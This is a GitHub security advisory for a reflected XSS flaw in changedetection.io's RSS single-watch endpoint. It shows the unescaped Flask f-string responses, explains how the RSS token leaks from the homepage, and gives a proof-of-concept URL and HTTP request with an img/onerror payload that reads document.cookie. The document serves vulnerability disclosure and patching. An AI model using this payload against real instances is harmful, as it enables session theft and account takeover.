# [M] changedetection.io Vulnerable to Reflected XSS in RSS Single Watch Error Response

## Summary
Severity: Medium
Advisory: GHSA-mw8m-398g-h89w
CVE: CVE-2026-27645
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-mw8m-398g-h89w
Type: github-advisory

## Affected
- PyPI: `changedetection.io` — affected >=0 <0.53.7

## Details
### Summary
Three security vulnerabilities were identified in [changedetection.io](http://changedetection.io/) through source code review and live validation against a locally deployed Docker instance. All vulnerabilities were confirmed exploitable on the latest version (0.53.6) it was additionally validated at scale against 500 internet-facing instances discovered via FOFA search engine, producing 5K+ confirmed detections using a custom Nuclei template, demonstrating widespread real-world impact.
The RSS single-watch endpoint reflects the UUID path parameter directly in the HTTP response body without HTML escaping. Since Flask returns text/html by default for plain string responses, the browser parses and executes injected JavaScript.

### Details
File: `changedetectionio/blueprint/rss/single_watch.py (lines ~45 and ~50)`

The UUID parameter from the URL path is interpolated into the response body using an f-string with no escaping:

### Line ~45
```
watch = datastore.data['watching'].get(uuid)
if not watch:
    return f"Watch with UUID {uuid} not found", 404  # ← No escaping, Content-Type: text/html
```

### Line ~50
```
if len(dates) < 2:
    return f"Watch {uuid} does not have enough history snapshots...", 400  # ← Same issue
Flask's default Content-Type for plain string responses is text/html; charset=utf-8, so any HTML/JavaScript in {uuid} is rendered by the browser.
```

## Attack Vector
The attack requires a valid RSS access token, which is a 32-character hex string exposed in the HTML <link> tag on the homepage without authentication:

<!-- Visible in page source of any unauthenticated instance -->
<link rel="alternate" type="application/rss+xml" href="/rss?token=f2bb14e20ff01bad83a743cf21b5df95">

Attacker visits the target's homepage if it unauthenticathed and extracts the RSS token from the <link> tag
Crafts a malicious URL:

1. http://target:5000/rss/watch/%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E?token=EXTRACTED_TOKEN
2. Sends the link to a victim who has an active session on the [changedetection.io](http://changedetection.io/) instance
3. When the victim clicks the link, the server responds with:
4. Watch with UUID not found

The browser renders the <img> tag, the onerror fires, and JavaScript executes in the victim's session context

### PoC
Request:

```
GET /rss/watch/%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E?token=223e7edbbfee2268f5abb5344919054e HTTP/1.1
Host: [127.0.0.1:5000](http://127.0.0.1:5000/)
```

Response:

```
HTTP/1.1 404 NOT FOUND
Content-Type: text/html; charset=utf-8
```

Watch with UUID not found


<img width="1918" height="1032" alt="image" src="https://github.com/user-attachments/assets/1633b167-e4ec-4705-a110-18fad7826fc9" />

The XSS payload is reflected unescaped in an HTML response. The browser executes alert(document.cookie).

Lots of intances over internet affected to this.
<img width="1465" height="721" alt="image" src="https://github.com/user-attachments/assets/f54160d4-abd1-4e8d-b845-f85e53e79325" />


### Impact
- Session cookie theft via document.cookie exfiltration
- Account takeover if session cookies lack HttpOnly flag
- Phishing via crafted links that appear to originate from a trusted [changedetection.io](http://changedetection.io/) instance
- Token is obtainable without authentication from the homepage <link> tag, lowering the barrier to exploitation

changedetection.io can work with developer teams to validate and address these issues. Please confirm receipt of this report and inform changedetection.io of the preferred timeline for coordinating the fix.

Roberto Nunes

## References
- https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-mw8m-398g-h89w
- https://nvd.nist.gov/vuln/detail/CVE-2026-27645
- https://github.com/dgtlmoon/changedetection.io/commit/a385c89abf44b52fcfa20c7c6a6dd3047c4c1eb5
- https://github.com/dgtlmoon/changedetection.io
